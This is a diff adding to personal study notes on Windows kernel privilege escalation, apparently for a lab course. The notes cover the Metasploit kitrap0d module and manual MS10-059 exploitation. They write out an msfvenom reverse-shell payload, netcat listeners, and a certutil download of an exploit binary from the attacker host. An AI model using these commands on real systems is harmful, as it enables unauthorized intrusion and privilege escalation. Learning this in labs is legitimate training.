@@ -270,3 +270,57 @@ Sometimes there will be a issue that shell isn't working well, see example below
 > Resources for this video:
 > Windows Kernel Exploits - [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits) 
 
+![[Pasted image 20230423143738.png]]
+
+![[Pasted image 20230423143847.png]]
+
+
+### Escalation with Metasploit
+
+> [!note] 
+> Resources for this video:
+> Kitrap0d Information - [https://seclists.org/fulldisclosure/2010/Jan/341](https://seclists.org/fulldisclosure/2010/Jan/341) 
+
+> [!todo] 
+>  meterpreter:
+>  `run post/multi/recon/local_exploit_suggester` > for all 32bit Windows versions
+>  `background`
+>  `use exploit/windows/local/ms10_015_kitrap0d`
+>  `set session 2`
+>  `set lhost tun0`
+>  `set lport 5555`
+>  `run`
+
+![[Pasted image 20230423153111.png]]
+
+
+### Manual Kernel Exploitation
+
+> [!note] 
+> Resources for this video:
+> MS10-059 Exploit - [https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059) 
+
+> [!todo] 
+>  `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.64 LPORT=4444 -f aspx > manual.aspx`
+>  `nc -nvlp 4444`
+
+![[Pasted image 20230423160307.png]]
+
+> [!todo] 
+> `python3 -m http.server` 
+
+> [!todo] 
+>   `nc -nvlp 5555`
+
+> [!todo] 
+> `certutil -urlcache -f http://10.10.14.64:8000/MS10-059.exe ms.exe`
+> `ms.exe 10.10.14.64 5555`
+
+![[Pasted image 20230423162606.png]]
+
+
+## Escalation Path: Passwords and Port Forwarding
+
+### Overview
+
+
